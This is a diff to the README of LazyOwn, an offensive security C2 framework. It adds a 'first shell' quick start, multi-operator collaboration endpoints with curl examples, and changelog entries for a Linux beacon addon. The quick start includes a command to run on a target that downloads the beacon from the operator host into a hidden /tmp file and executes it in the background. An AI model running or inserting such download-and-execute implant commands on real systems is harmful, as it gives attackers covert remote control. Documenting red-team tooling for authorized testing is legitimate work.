@@ -61,7 +61,80 @@ Connect Claude Code to the LazyOwn framework via the Model Context Protocol (MCP
 | `skills/lazyown_facts.py` | Structured fact extraction from nmap XML and tool output |
 | `skills/lazyown_parquet_db.py` | Parquet knowledge base: session history, GTFOBins, LOLBas, ATT&CK |
 
-## Quick Start
+## Quick Start (5 minutes to first shell)
+
+> Full guide: [`QUICKSTART.md`](QUICKSTART.md)
+
+```bash
+# 1. Clone and install
+git clone https://github.com/grisuno/LazyOwn.git && cd LazyOwn && bash install.sh
+
+# 2. Launch and run the wizard (auto-detects lhost, walks 7 config steps)
+./run
+(LazyOwn) > wizard
+
+# 3. Recon
+(LazyOwn) > ping && lazynmap && auto_populate && facts_show
+
+# 4. Start C2 (separate terminal)
+bash fast_run_as_r00t.sh --no-attach --vpn 1
+
+# 5. Get a shell — Linux BOF-capable beacon
+(LazyOwn) > blacksandbeacon
+# Then on target: curl -sk "http://<lhost>:<lport>/blacksandbeacon" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
+
+# 6. Invite teammates (multi-operator)
+(LazyOwn) > collab_join alice
+# Prints: https://<lhost>:<c2_port>/collab/?operator=alice
+```
+
+---
+
+## Multi-Operator Collaboration
+
+LazyOwn's collab layer provides real-time team server functionality via
+Server-Sent Events (SSE). It activates automatically when `lazyc2.py` starts.
+
+**Browser dashboard** — open in any browser on the team:
+```
+https://<lhost>:<c2_port>/collab/?operator=<your_handle>
+```
+
+**Terminal SSE stream**:
+```bash
+curl --insecure -N "https://<lhost>:<c2_port>/collab/stream?operator=alice" | jq .
+```
+
+**Publish a finding to all operators**:
+```bash
+curl --insecure -sk -X POST https://<lhost>:<c2_port>/collab/publish \
+  -H "Content-Type: application/json" \
+  -d '{"type":"finding","operator":"alice","payload":{"target":"10.10.11.5","detail":"root via CVE-2024-xxxx"}}'
+```
+
+**Lock a target** (prevents two operators running the same tool):
+```bash
+curl --insecure -sk -X POST https://<lhost>:<c2_port>/collab/lock \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.10.11.5","operator":"alice","ttl_secs":300}'
+```
+
+| Endpoint | Method | Description |
+|---|---|---|
+| `/collab/` | GET | Multi-operator browser dashboard |
+| `/collab/stream?operator=<name>` | GET (SSE) | Real-time event stream |
+| `/collab/operators` | GET | Active operator list |
+| `/collab/publish` | POST | Broadcast a structured event |
+| `/collab/lock` | POST | Acquire advisory target lock |
+| `/collab/unlock` | POST | Release target lock |
+| `/collab/locks` | GET | All active locks |
+| `/collab/history?n=100` | GET | Last N events |
+
+From the CLI: `collab_join <handle>` prints all URLs for a given operator.
+
+---
+
+## MCP Quick Start
 
 ### 1. Register the MCP server
 
@@ -3449,6 +3522,22 @@ The ``textual`` package must be installed (``pip install textual``). When
 the package is missing the command prints an install hint and returns.
 
 :param line: Unused. Reserved for future flags.
+:type line: str
+:return: None
+
+## collab_join
+Print the multi-operator collaboration join URL and SSE endpoint.
+
+Outputs the URL teammates need to open in a browser to connect to the
+shared operator dashboard at /collab/ and the curl command to consume
+the SSE event stream from a terminal.
+
+Usage:
+    ``collab_join``                    — print join URL for current lhost/c2_port
+    ``collab_join alice``              — print URL with operator handle pre-filled
+    ``collab_join alice --curl``       — also print the curl SSE command
+
+:param line: Optional operator handle and flags.
 :type line: str
 :return: None
 
@@ -12880,6 +12969,20 @@ No description available.
 <!-- START CHANGELOG -->
 
 # Changelog
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): blacksandbeacon Linux BOF addon \n\n Version: release/0.2.117 \n\n add blacksandbeacon and blacksandbeacon_bof lazyaddons with 59 tests and README updates \n\n Modified file(s):\n- README.md - lazyaddons/blacksandbeacon.yaml - lazyaddons/blacksandbeacon_bof.yaml - tests/test_blacksandbeacon_addon.py\nCreated file(s):\n- lazyaddons/blacksandbeacon.yaml - lazyaddons/blacksandbeacon_bof.yaml - tests/test_blacksandbeacon_addon.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: vie 15 may 2026 14:02:09 -04 \n\n Hora: 1778868129
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(c2): add blacksandbeacon lazyaddon with Linux BOF support
 
 
 ### Nuevas características
